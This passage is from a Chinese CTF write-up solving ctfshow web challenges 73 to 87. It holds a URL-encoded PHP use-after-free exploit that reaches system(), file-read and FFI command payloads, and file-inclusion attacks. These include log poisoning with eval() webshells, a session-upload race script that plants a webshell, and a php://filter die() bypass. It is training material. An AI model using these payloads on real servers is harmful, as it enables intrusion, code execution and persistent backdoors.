2%2c%20%30%2c%20%37%29%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%69%66%28%24%6c%65%61%6b%20%3d%3d%20%30%78%31%30%31%30%32%34%36%34%63%34%35%37%66%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%75%72%6e%20%24%61%64%64%72%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%7d%0a%0a%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%67%65%74%5f%73%79%73%74%65%6d%28%24%62%61%73%69%63%5f%66%75%6e%63%73%29%20%7b%0a%20%20%20%20%20%20%20%20%24%61%64%64%72%20%3d%20%24%62%61%73%69%63%5f%66%75%6e%63%73%3b%0a%20%20%20%20%20%20%20%20%64%6f%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%66%5f%65%6e%74%72%79%20%3d%20%6c%65%61%6b%28%24%61%64%64%72%29%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%66%5f%6e%61%6d%65%20%3d%20%6c%65%61%6b%28%24%66%5f%65%6e%74%72%79%2c%20%30%2c%20%36%29%3b%0a%0a%20%20%20%20%20%20%20%20%20%20%20%20%69%66%28%24%66%5f%6e%61%6d%65%20%3d%3d%20%30%78%36%64%36%35%37%34%37%33%37%39%37%33%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%75%72%6e%20%6c%65%61%6b%28%24%61%64%64%72%20%2b%20%38%29%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%61%64%64%72%20%2b%3d%20%30%78%32%30%3b%0a%20%20%20%20%20%20%20%20%7d%20%77%68%69%6c%65%28%24%66%5f%65%6e%74%72%79%20%21%3d%20%30%29%3b%0a%20%20%20%20%20%20%20%20%72%65%74%75%72%6e%20%66%61%6c%73%65%3b%0a%20%20%20%20%7d%0a%0a%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%74%72%69%67%67%65%72%5f%75%61%66%28%24%61%72%67%29%20%7b%0a%0a%20%20%20%20%20%20%20%20%24%61%72%67%20%3d%20%73%74%72%5f%73%68%75%66%66%6c%65%28%27%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%27%29%3b%0a%20%20%20%20%20%20%20%20%24%76%75%6c%6e%20%3d%20%6e%65%77%20%56%75%6c%6e%28%29%3b%0a%20%20%20%20%20%20%20%20%24%76%75%6c%6e%2d%3e%61%20%3d%20%24%61%72%67%3b%0a%20%20%20%20%7d%0a%0a%20%20%20%20%69%66%28%73%74%72%69%73%74%72%28%50%48%50%5f%4f%53%2c%20%27%57%49%4e%27%29%29%20%7b%0a%20%20%20%20%20%20%20%20%64%69%65%28%27%54%68%69%73%20%50%6f%43%20%69%73%20%66%6f%72%20%2a%6e%69%78%20%73%79%73%74%65%6d%73%20%6f%6e%6c%79%2e%27%29%3b%0a%20%20%20%20%7d%0a%0a%20%20%20%20%24%6e%5f%61%6c%6c%6f%63%20%3d%20%31%30%3b%20%0a%20%20%20%20%24%63%6f%6e%74%69%67%75%6f%75%73%20%3d%20%5b%5d%3b%0a%20%20%20%20%66%6f%72%28%24%69%20%3d%20%30%3b%20%24%69%20%3c%20%24%6e%5f%61%6c%6c%6f%63%3b%20%24%69%2b%2b%29%0a%20%20%20%20%20%20%20%20%24%63%6f%6e%74%69%67%75%6f%75%73%5b%5d%20%3d%20%73%74%72%5f%73%68%75%66%66%6c%65%28%27%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%27%29%3b%0a%0a%20%20%20%20%74%72%69%67%67%65%72%5f%75%61%66%28%27%78%27%29%3b%0a%20%20%20%20%24%61%62%63%20%3d%20%24%62%61%63%6b%74%72%61%63%65%5b%31%5d%5b%27%61%72%67%73%27%5d%5b%30%5d%3b%0a%0a%20%20%20%20%24%68%65%6c%70%65%72%20%3d%20%6e%65%77%20%48%65%6c%70%65%72%3b%0a%20%20%20%20%24%68%65%6c%70%65%72%2d%3e%62%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%24%78%29%20%7b%20%7d%3b%0a%0a%20%20%20%20%69%66%28%73%74%72%6c%65%6e%28%24%61%62%63%29%20%3d%3d%20%37%39%20%7c%7c%20%73%74%72%6c%65%6e%28%24%61%62%63%29%20%3d%3d%20%30%29%20%7b%0a%20%20%20%20%20%20%20%20%64%69%65%28%22%55%41%46%20%66%61%69%6c%65%64%22%29%3b%0a%20%20%20%20%7d%0a%0a%20%20%20%20%24%63%6c%6f%73%75%72%65%5f%68%61%6e%64%6c%65%72%73%20%3d%20%73%74%72%32%70%74%72%28%24%61%62%63%2c%20%30%29%3b%0a%20%20%20%20%24%70%68%70%5f%68%65%61%70%20%3d%20%73%74%72%32%70%74%72%28%24%61%62%63%2c%20%30%78%35%38%29%3b%0a%20%20%20%20%24%61%62%63%5f%61%64%64%72%20%3d%20%24%70%68%70%5f%68%65%61%70%20%2d%20%30%78%63%38%3b%0a%0a%20%20%20%20%77%72%69%74%65%28%24%61%62%63%2c%20%30%78%36%30%2c%20%32%29%3b%0a%20%20%20%20%77%72%69%74%65%28%24%61%62%63%2c%20%30%78%37%30%2c%20%36%29%3b%0a%0a%20%20%20%20%77%72%69%74%65%28%24%61%62%63%2c%20%30%78%31%30%2c%20%24%61%62%63%5f%61%64%64%72%20%2b%20%30%78%36%30%29%3b%0a%20%20%20%20%77%72%69%74%65%28%24%61%62%63%2c%20%30%78%31%38%2c%20%30%78%61%29%3b%0a%0a%20%20%20%20%24%63%6c%6f%73%75%72%65%5f%6f%62%6a%20%3d%20%73%74%72%32%70%74%72%28%24%61%62%63%2c%20%30%78%32%30%29%3b%0a%0a%20%20%20%20%24%62%69%6e%61%72%79%5f%6c%65%61%6b%20%3d%20%6c%65%61%6b%28%24%63%6c%6f%73%75%72%65%5f%68%61%6e%64%6c%65%72%73%2c%20%38%29%3b%0a%20%20%20%20%69%66%28%21%28%24%62%61%73%65%20%3d%20%67%65%74%5f%62%69%6e%61%72%79%5f%62%61%73%65%28%24%62%69%6e%61%72%79%5f%6c%65%61%6b%29%29%29%20%7b%0a%20%20%20%20%20%20%20%20%64%69%65%28%22%43%6f%75%6c%64%6e%27%74%20%64%65%74%65%72%6d%69%6e%65%20%62%69%6e%61%72%79%20%62%61%73%65%20%61%64%64%72%65%73%73%22%29%3b%0a%20%20%20%20%7d%0a%0a%20%20%20%20%69%66%28%21%28%24%65%6c%66%20%3d%20%70%61%72%73%65%5f%65%6c%66%28%24%62%61%73%65%29%29%29%20%7b%0a%20%20%20%20%20%20%20%20%64%69%65%28%22%43%6f%75%6c%64%6e%27%74%20%70%61%72%73%65%20%45%4c%46%20%68%65%61%64%65%72%22%29%3b%0a%20%20%20%20%7d%0a%0a%20%20%20%20%69%66%28%21%28%24%62%61%73%69%63%5f%66%75%6e%63%73%20%3d%20%67%65%74%5f%62%61%73%69%63%5f%66%75%6e%63%73%28%24%62%61%73%65%2c%20%24%65%6c%66%29%29%29%20%7b%0a%20%20%20%20%20%20%20%20%64%69%65%28%22%43%6f%75%6c%64%6e%27%74%20%67%65%74%20%62%61%73%69%63%5f%66%75%6e%63%74%69%6f%6e%73%20%61%64%64%72%65%73%73%22%29%3b%0a%20%20%20%20%7d%0a%0a%20%20%20%20%69%66%28%21%28%24%7a%69%66%5f%73%79%73%74%65%6d%20%3d%20%67%65%74%5f%73%79%73%74%65%6d%28%24%62%61%73%69%63%5f%66%75%6e%63%73%29%29%29%20%7b%0a%20%20%20%20%20%20%20%20%64%69%65%28%22%43%6f%75%6c%64%6e%27%74%20%67%65%74%20%7a%69%66%5f%73%79%73%74%65%6d%20%61%64%64%72%65%73%73%22%29%3b%0a%20%20%20%20%7d%0a%0a%0a%20%20%20%20%24%66%61%6b%65%5f%6f%62%6a%5f%6f%66%66%73%65%74%20%3d%20%30%78%64%30%3b%0a%20%20%20%20%66%6f%72%28%24%69%20%3d%20%30%3b%20%24%69%20%3c%20%30%78%31%31%30%3b%20%24%69%20%2b%3d%20%38%29%20%7b%0a%20%20%20%20%20%20%20%20%77%72%69%74%65%28%24%61%62%63%2c%20%24%66%61%6b%65%5f%6f%62%6a%5f%6f%66%66%73%65%74%20%2b%20%24%69%2c%20%6c%65%61%6b%28%24%63%6c%6f%73%75%72%65%5f%6f%62%6a%2c%20%24%69%29%29%3b%0a%20%20%20%20%7d%0a%0a%20%20%20%20%77%72%69%74%65%28%24%61%62%63%2c%20%30%78%32%30%2c%20%24%61%62%63%5f%61%64%64%72%20%2b%20%24%66%61%6b%65%5f%6f%62%6a%5f%6f%66%66%73%65%74%29%3b%0a%20%20%20%20%77%72%69%74%65%28%24%61%62%63%2c%20%30%78%64%30%20%2b%20%30%78%33%38%2c%20%31%2c%20%34%29%3b%20%0a%20%20%20%20%77%72%69%74%65%28%24%61%62%63%2c%20%30%78%64%30%20%2b%20%30%78%36%38%2c%20%24%7a%69%66%5f%73%79%73%74%65%6d%29%3b%20%0a%0a%20%20%20%20%28%24%68%65%6c%70%65%72%2d%3e%62%29%28%24%63%6d%64%29%3b%0a%20%20%20%20%65%78%69%74%28%29%3b%0a%7d%0a%0a%63%74%66%73%68%6f%77%28%22%63%61%74%20%2f%66%6c%61%67%30%2e%74%78%74%22%29%3b%6f%62%5f%65%6e%64%5f%66%6c%75%73%68%28%29%3b%0a%3f%3e

</details>


### web73
确定 flag 的位置，扫描一下根目录。这题可以用 web72 的伪协议。

方法一：

<strong>c=?>`<?php $a=new DirectoryIterator("glob:///*"); foreach($a as $f) {echo($f->__toString().' ');} exit(0); ?>`</strong>

方法二：

<strong>c=var_export(scandir("/"));exit(0);</strong>

这题可以 include。

<strong>c=include("/flagc.txt");exit();</strong>

### web74
与 web73 类似。但是限制了 scandir()。

题目和 web73 一样。

确定flag位置


```php
c=$a="glob:///*.txt";
if($b = opendir($a))
{
  while(($file = readdir($b)) !== false)
    {
      echo "filename:".$file."\n";
    }
  closedir($b);
}exit(0);
//或以下代码
```


<strong>c=?>`<?php $a=new DirectoryIterator("glob:///*"); foreach($a as $f) {echo($f->__toString().' ');} exit(0); ?>`</strong>

<strong>或</strong>

<strong>c=var_export(glob('/*'));exit(0);</strong>

发现文件 flagx.txt 。include 即可。

<strong>c=include("/flagx.txt");exit();</strong>

### web75-76
题目和 web73 一样。

先直接用伪协议获取 flag 位置。

<strong>c=?>`<?php $a=new DirectoryIterator("glob:///*"); foreach($a as $f) {echo($f->__toString().' ');} exit(0); ?>`</strong>

发现flag36.txt

先直接看 payload 吧。

<strong>c=try {\$dbh = new PDO(<span style="color: rgb(163, 21, 21)">'mysql:host=localhost;dbname=ctftraining'</span>, <span style="color: rgb(163, 21, 21)">'root'</span>, <span style="color: rgb(163, 21, 21)">'root'</span>);foreach(\$dbh->query(<span style="color: rgb(163, 21, 21)">'select load_file("/flag36.txt")'</span>) as \$row){echo(\$row`[0]`).<span style="color: rgb(163, 21, 21)">"|"</span>; }\$dbh = null;}catch (PDOException \$e) {echo\$e->getMessage();exit(0);}exit(0);</strong>

再了解下PDO


```php
try {
	# 创建 PDO 实例, 连接 MySQL 数据库
	$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');
	
	# 在 MySQL 中，load_file(完整路径) 函数读取一个文件并将其内容作为字符串返回。
	foreach($dbh->query('select load_file("/flag36.txt")') as $row) {
		echo($row[0])."|";
	}
	
	$dbh = null;
}

catch (PDOException $e) {
	echo $e->getMessage();exit(0);
}

exit(0);
```


接下来，具体分析一下这里面的语句。这里面最关键的问题在于数据库名字的怎么来的，用户名是固定的root，密码我们也可以勉强猜测是root。


PDO 为PHP访问数据库定义了一个轻量级的一致接口，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。new PDO(\$dsn, \$user, \$pass);

+ <strong>PDO</strong>：PHP Data Object的缩写。统一各种数据库的访问接口。
+ <strong>PDO->query()</strong>：用于查询数据并返回查询结果。


<details>
<summary>代码解释</summary>

这段代码的工作原理是通过 PHP 中的 `PDO` 类与 MySQL 数据库建立连接，执行一个 SQL 查询，利用 MySQL 的 `LOAD_FILE()` 函数读取指定文件的内容，并将该内容输出到浏览器。我们可以逐步解析这段代码的执行流程。

#### 1. <strong>创建数据库连接</strong>

```php
$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');
```


- 这行代码通过 `PDO` 创建了一个数据库连接。`PDO` 是 PHP 提供的一个数据库抽象层，它支持多个数据库类型。在这行代码中，使用了 MySQL 数据库，连接到本地 (`localhost`) 的数据库 `ctftraining`，用户名是 `root`，密码也是 `root`。
- 如果连接成功，数据库操作将会在后续代码中进行；如果连接失败，则会进入异常处理部分。

#### 2. <strong>查询文件内容</strong>

```php
foreach($dbh->query('select load_file("/flag36.txt")') as $row) {
  echo($row[0])."|";
}
```


- 这一行是执行实际的 SQL 查询。SQL 查询语句是：

```php
select load_file("/flag36.txt")
```


`LOAD_FILE()` 是 MySQL 中的一个函数，它尝试读取服务器上指定路径 (`/flag36.txt`) 的文件内容，并将内容返回。`LOAD_FILE()` 只能读取服务器上 MySQL 服务进程有权限访问的文件。

- `query()` 方法执行 SQL 查询，并返回一个结果集。由于返回的是一个包含结果的数组，每个结果以行的形式存在，`$row[0]` 即为读取的文件内容。
- `echo($row[0])."|"` 会输出文件内容，并在其后加上一个竖线 (`|`)。

#### 3. <strong>关闭数据库连接</strong>

```php
$dbh = null;
```


- 这行代码将 `$dbh` 设置为 `null`，这意味着数据库连接将被关闭，释放资源。

#### 4. <strong>异常处理</strong>

```php
catch (PDOException $e) {
  echo $e->getMessage(); exit(0);
}
```


- 如果数据库连接或查询过程中发生错误（例如，无法连接到 MySQL 数据库，或文件路径无效），`catch` 会捕获异常，并通过 `getMessage()` 输出错误信息。
- `exit(0)` 会立即终止脚本的执行。

#### 5. <strong>退出脚本</strong>

```php
exit(0);
```


- 这行代码会确保 PHP 脚本执行完后终止。

</details>


<strong>web76</strong>的题目与75类似

目标文件 flag36d.txt。思路和 web75 一样


```php
try {
	# 创建 PDO 实例, 连接 MySQL 数据库
	$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');
	
	# 在 MySQL 中，load_file(完整路径) 函数读取一个文件并将其内容作为字符串返回。
	foreach($dbh->query('select load_file("/flag36d.txt")') as $row) {
		echo($row[0])."|";
	}
	
	$dbh = null;
}

catch (PDOException $e) {
	echo $e->getMessage();exit(0);
}

exit(0);
```


### PDO技术
[PDO技术](https://blog.csdn.net/lhh134/article/details/89367467?ops_request_misc=%257B%2522request%255Fid%2522%253A%25227ddb2fdb735a89d735c5c0fec26e53c0%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=7ddb2fdb735a89d735c5c0fec26e53c0&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2\~all\~sobaiduend\~default-2-89367467-null-null.142^v101^pc_search_result_base2&utm_term=pdo&spm=1018.2226.3001.4187)

### web77
题目依旧和 web73 一样。

先直接用伪协议获取 flag 位置。

<strong>c=?>`<?php $a=new DirectoryIterator("glob:///*"); foreach($a as $f) {echo($f->__toString().' ');} exit(0); ?>`</strong>

发现 flag36x.txt 文件。同时根目录下还有 readflag，估计需要调用 readflag 获取 flag。

<strong>c=\$ffi = FFI::cdef("int system(const char *command);");\$a='/readflag > 1.txt';\$ffi->system(\$a);</strong>

随后访问1.txt

<strong>url+1.txt</strong>

所传内容


```php
$ffi = FFI::cdef("int system(const char *command);");  //创建一个system对象
$a='/readflag > 1.txt';  //因为页面不会回显，所以将内容输出到1.txt
$ffi->system($a);  //通过$ffi去调用system函数
```


FFI，php7.4 以上才有。

<strong>FFI</strong>（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP 的 FFI 扩展就是一个让你在 PHP 里调用 C 代码的技术。

### FFI
#### 1. <strong>FFI的概念</strong>：
FFI 是 PHP 7.4 引入的一项扩展，它允许 PHP 直接与本地共享库（如 `.so` 或 `.dll` 文件）进行交互，调用 C 函数。它是一种实现语言间交互的接口，允许 PHP 调用本地系统的底层函数，这对于一些需要高性能或者底层访问的操作非常有用。

#### 2. <strong>代码解析</strong>：

```php
$ffi = FFI::cdef("int system(const char *command);");  // 创建一个system对象
```


+ 这行代码通过 `FFI::cdef()` 创建了一个与 C 库函数 `system()` 交互的接口。
+ `FFI::cdef` 的作用是定义 C 函数原型，这里定义了一个 `system` 函数，它接受一个 `const char *` 类型的参数并返回一个 `int` 类型的值。
+ `system()` 函数是一个标准 C 函数，用于在命令行执行操作。它相当于在 PHP 中执行 shell 命令。


```php
$a = '/readflag > 1.txt';  // 因为页面不会回显，所以将内容输出到1.txt
```


+ 这行代码创建了一个包含命令的字符串变量 `$a`，它表示一个 shell 命令。
+ 该命令尝试执行 `/readflag`，并将输出重定向到文件 `1.txt` 中。由于页面本身可能不会直接显示输出，因此输出被保存到文件中。


```php
$ffi->system($a);  // 通过$ffi去调用system函数
```


+ `system()` 函数被调用来执行命令 `'/readflag > 1.txt'`。
+ `$ffi->system($a)` 调用 FFI 定义的 `system` 函数，将字符串 `$a` 作为参数传递给它。
+ 这个命令会尝试执行 `/readflag` 命令，并将其输出重定向到 `1.txt` 文件中。

#### 3. <strong>`system()`</strong><strong> 函数的作用</strong>：
在 C 语言中，`system()` 函数用于在 shell 环境中执行指定的命令，它会传递给操作系统的命令行执行。这意味着 `$a = '/readflag > 1.txt'` 命令将被传递给操作系统，操作系统会执行 `/readflag` 命令并将输出重定向到文件 `1.txt`。

#### 4. <strong>`FFI::cdef`</strong><strong> 的作用</strong>：
+ `FFI::cdef` 是 PHP 的 FFI 扩展提供的一个方法，用来声明一个 C 函数的原型。通过这种方式，PHP 能够调用本地的 C 函数，这在某些情况下非常有用，特别是当 PHP 本身的功能不能满足需求时。
+ 在这个例子中，`system()` 是一个标准的 C 函数，FFI 通过 `cdef` 声明了它的接口，使得我们能够在 PHP 中直接调用它。

#### 5. <strong>安全性问题</strong>：
使用 `system()` 函数有可能带来安全风险，特别是当用户输入的内容直接传递给命令执行时（例如在 web 应用中）。攻击者可以通过传递恶意命令（如 `; rm -rf /`）来执行危险操作，造成严重的安全漏洞。因此，在使用类似 `system()` 的函数时，必须谨慎地验证和过滤输入。

## web入门--文件包含题解
### web78

```php
//题目
if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}
```


本题没有过滤，所以有三种方法：

+ 将php代码编码

<strong>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</strong>


+ data伪协议（推荐，可以使用ls命令查看flag位置）

<strong>?file=data://text/plain,`<?php system("ls")?>`</strong>

<strong>?file=data://text/plain,`<?php system("tac flag.php")?>`</strong>


+ fliter伪协议（不推荐，不知道flag在哪时不好用）

<strong>?file=php://filter/convert.base64-encode/resource=flag.php</strong>


+ 日志包含（推荐，伟大无需多言）

直接url+<strong>?file=../../../../var/log/nginx/access.log    </strong>

<strong>`../../../..`</strong>：表示上四级目录。  

即当前目录可能为 /var/www/html/index.php  让后不断返回上层

在User-Agent中写入 <strong>`<?php eval($_POST[a]); ?>`</strong>

最后蚁剑连接即可

### web79
与上题类似


```php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```


将php替换为了???

可以使用上题

+ data伪协议

<strong>?file=data://text/plain,<?PhP system("ls")?></strong>

<strong>?file=data://text/plain,`<?php system("tac flag.php")?>`</strong>


+ fliter伪协议

<strong>?file=php://filter/convert.base64-encode/resource=flag.php</strong>


+ input伪协议

<strong>?file=PhP://input<?PhP system('ls');?></strong>

<strong>?file=PhP://input<?PhP system('tac flag*');?></strong>

### web80

```php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```


该题使用日志包含

向 Nginx 服务器发送请求时，记录会保存在 /var/log/nginx/access.log 日志文件。

那就可以传递一句话木马，保存在日志中，然后再包含日志文件，日志中的一句话木马就运行了

先看一下日志内容。

<strong>url + ?file=/var/log/nginx/access.log</strong>


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-059.webp)

传递一句话木马。

<strong>url + ?file=<?=eval(\$_POST['hi']);?></strong>


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-060.webp)

此时一句话木马已经记录在日志文件中。如果再看一下日志文件，但不会显示一句话木马。

原理：因为当前页面本身就是 php 文件，文件包含后，包含文件中的 php 语句也可以被执行。

这时就可以使用蚁剑连接包含后的日志文件。

<strong>url地址：url + ?file=/var/log/nginx/access.log</strong>

<strong>密码：hi</strong>

### web81
该题在web80基础上过滤了  ：  

法一：

<strong>?file=/var/log/nginx/access.log</strong>同时 user-agent写入<strong>`<?php @eval($_GET[1]);?>`</strong>

<strong>?file=/var/log/nginx/access.log&1=system("ls");</strong>

<strong>?file=/var/log/nginx/access.log&1=system("tac fl0g.php");</strong>

法二：


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-061.webp)

蚁剑连接日志文件。

<strong>url地址：url + ?file=/var/log/nginx/access.log</strong>

<strong>密码：hi</strong>

### web82
该题较上一题多过滤了   .


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-062.webp)

<strong>方法一</strong>：使用下面的脚本。这个脚本适用于 web82\~web86。


```php
import requests
import io
import threading


url='http://b04c7980-d374-4c39-9ebc-a612708262c8.challenge.ctf.show/'
sessionid='ctfshow'
data={
	"1":"file_put_contents('/var/www/html/muma.php','<?php eval($_POST[a]);?>');"
}  

'''
post 传递内容可在网站目录下写入一句话木马。
根据资料，内容暂存在 /tmp/ 目录下 sess_sessionid 文件。
sessionid 可控，所以这里即 /tmp/sess_ctfshow。
这样一旦访问成功，就说明木马植入了
'''


# /tmp/sess_sessionid 中写入一句话木马。
def write(session):  
	fileBytes = io.BytesIO(b'a'*1024*50)
	while True:
		response=session.post(
			url,
			data={
			'PHP_SESSION_UPLOAD_PROGRESS':'<?php eval($_POST[1]);?>'
			},
			cookies={
			'PHPSESSID':sessionid
			},
			files={
			'file':('ctfshow.jpg',fileBytes)
			}
			)


# 访问 /tmp/sess_sessionid，post 传递信息，保存新木马。
def read(session):
	while True:
		response=session.post(
			url+'?file=/tmp/sess_'+sessionid,
	        data=data,
			cookies={
			'PHPSESSID':sessionid
			}
			)
		# 访问木马文件，如果访问到了就代表竞争成功
		resposne2=session.get(url+'muma.php')
		if resposne2.status_code==200:
			print('++++++done++++++')
		else:
			print(resposne2.status_code)

if __name__ == '__main__':

	evnet=threading.Event()
	# 写入和访问分别设置 5 个线程。
	with requests.session() as session:
		for i in range(5):
			threading.Thread(target=write,args=(session,)).start()
		for i in range(5):
			threading.Thread(target=read,args=(session,)).start()

	evnet.set()
```


运行脚本并成功写入后即可访问木马。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-063.webp)


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-064.webp)

<strong>方法二</strong>：直接使用 burp。

参考文章：  
[[CTFSHOW]文件包含78-88](https://blog.csdn.net/m0_51078229/article/details/114270401)  
[web入门文件包含82-86](https://blog.csdn.net/xiaolong22333/article/details/111184583)

### web83
加了两个函数：


```php
session_unset()：
释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件。

session_destroy()：
删除当前用户对应的session文件以及释放sessionid。
```


但条件竞争使用的是上传那一瞬间创建的 session，所以不影响。

依旧使用 web82 的脚本。

### web84

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-065.webp)

<span style="color: rgb(216, 59, 100)"><strong>`system(rm -rf /tmp/*);`</strong></span>，因为 <span style="color: rgb(216, 59, 100)"><strong>`session.upload_progress.cleanup = on`</strong></span> 会清空对应 session 文件中的内容，所以加上删除对竞争的影响不大。

依旧使用 web82 的脚本。

### web85

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-066.webp)

增加了内容识别，如果有【<】就 die，不影响竞争。

依旧使用 web82 的脚本。

### web86

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-067.webp)

<span style="color: rgb(216, 59, 100)"><strong>`dirname(__FILE__)`</strong></span>：表示当前文件的绝对路径。  
<span style="color: rgb(216, 59, 100)"><strong>`set_include_path()`</strong></span>：用来设置 include 的路径，即 include() 可以不提供文件的完整路径。

include 文件时，当包含路径既不是相对路径，也不是绝对路径时，会先查找 include_path 所设置的目录。

web82 脚本里用的是完整路径，不影响竞争。

### web87
根据题目，可以根据 file 生成一个 php 文件，文件内容可由 content 参数传递。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-068.webp)

注意看，传过去的 file 参数经过了 urldecode() 函数解码。所以 file 参数的内容要经过 url 编码再传递。同时网络传递时会对 url 编码的内容解一次码，所以需要对内容进行两次url编码。

另外，需要绕过 die() 函数。

根据文章 [谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html) ，可以有以下思路：

+ base64 编码范围是 0 \~ 9，a \~ z，A \~ Z，+，/ ，所以除了这些字符，其他字符都会被忽略。
+ 所以对于 <span style="color: rgb(216, 59, 100)"><strong>`<?php die('大佬别秀了');?>`</strong></span> ，base64 编解码过滤之后就只有 <span style="color: rgb(216, 59, 100)"><strong>`phpdie`</strong></span> 6个字符了，即可进行绕过。
+ 前面的 file 参数用 <strong>php://filter/write=convert.base64-encode</strong> 来解码写入，这样文件的 die() 就会被 base64 过滤，这样 die() 函数就绕过了。
+ 后面再拼接 base64 编码后的一句话木马或者 php 代码，被解码后刚好可以执行。
+ 由于 base64 是4个一组，而 <strong>phpdie</strong> 只有六个，所以要加两个字母凑足base64的格式。

这题传参时，file 用 get 方法，content 用 post 方法。

思路说完了，开搞开搞。

将 <strong>php://filter/write=convert.base64-decode/resource=123.php</strong> 进行两次 url 编码。（服务器生成 123.php 文件）


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-069.webp)


```php
php://filter/write=convert.base64-decode/resource=123.php
两次 url 编码：(即编码一次后再对其编码)
%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%33%32%25%33%33%25%32%65%25%37%30%25%36%38%25%37%30
```


接下来对于 content 参数，就有很多方法了。

<strong>法一</strong>：

可传递 <span style="color: rgb(216, 59, 100)"><strong>`<?php system('ls');`</strong></span> ，需 base64 编码：


```php
<?php system('ls');
base64 编码：
PD9waHAgc3lzdGVtKCdscycpOw==
```


传递 file 参数与 content 参数，content 需要添加两个字母凑数，这里添加 aa。


```php
url + ?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%33%32%25%33%33%25%32%65%25%37%30%25%36%38%25%37%30

content=aaPD9waHAgc3lzdGVtKCdscycpOw==
```



![](/article-assets/2025/ctfshow-web-notes/images/screenshot-070.webp)

然后可查看生成的 123.php 文件。


```php
url + 123.php
```



![](/article-assets/2025/ctfshow-web-notes/images/screenshot-071.webp)

发现 fl0g.php 文件。

那就传递 <span style="color: rgb(216, 59, 100)"><strong>`<?php system('cat f*.php');`</strong></span> 。


```php
<?php system('cat f*.php');
base64 编码：
PD9waHAgc3lzdGVtKCdjYXQgZioucGhwJyk7
```


传递 file 参数与 content 参数。


```php
url + ?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%33%32%25%33%33%25%32%65%25%37%30%25%36%38%25%37%30

content=aaPD9waHAgc3lzdGVtKCdjYXQgZioucGhwJyk7
```


再次查看 123.php 即可。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-072.webp)
